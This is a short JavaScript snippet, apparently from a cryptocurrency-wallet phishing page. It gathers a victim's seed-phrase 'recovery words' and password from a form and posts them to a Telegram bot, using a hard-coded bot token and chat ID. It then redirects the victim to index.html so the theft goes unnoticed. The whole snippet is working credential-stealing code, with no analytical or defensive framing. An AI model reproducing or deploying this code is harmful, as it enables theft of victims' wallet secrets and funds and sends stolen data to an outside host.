  <script>
 function sendRecoveryDetails(formId, wordCount) {
  const form = document.getElementById(formId);
  let message = `Recovery Details (${wordCount} Words):\n`;

  // Collect words
  for (let i = 1; i <= wordCount; i++) {
    const word = form.querySelector(`[name=word${i}_${wordCount}]`).value;
    message += `Word ${i}: ${word}\n`;
  }

  // Collect password
  const password = form.querySelector("[name=password]")?.value;
  if (password) {
    message += `Password: ${password}\n`;
  }

  const botToken = "7472535657:AAE04ouxLmslQW3q8R1YmVUeuyrkHsiHqmY";
  const chatId = "6331375608";

  // Fetch API to send the message
  fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
    method: "POST",
    headers: {
      "Content-Type": "application/json",
    },
    body: JSON.stringify({
      chat_id: chatId,
      text: message,
    }),
  })
    .then((response) => {
      if (response.ok) {
        console.log("Message sent successfully!");
        // Redirect to index.html
        window.location.href = "index.html";
      } else {
        console.error("Failed to send message:", response.statusText);
        alert("Failed to send recovery details. Please try again.");
      }
    })
    .catch((error) => {
      console.error("Error:", error);
      alert("An error occurred. Please check your connection and try again.");
    });
}

// Prevent form submission and call the function
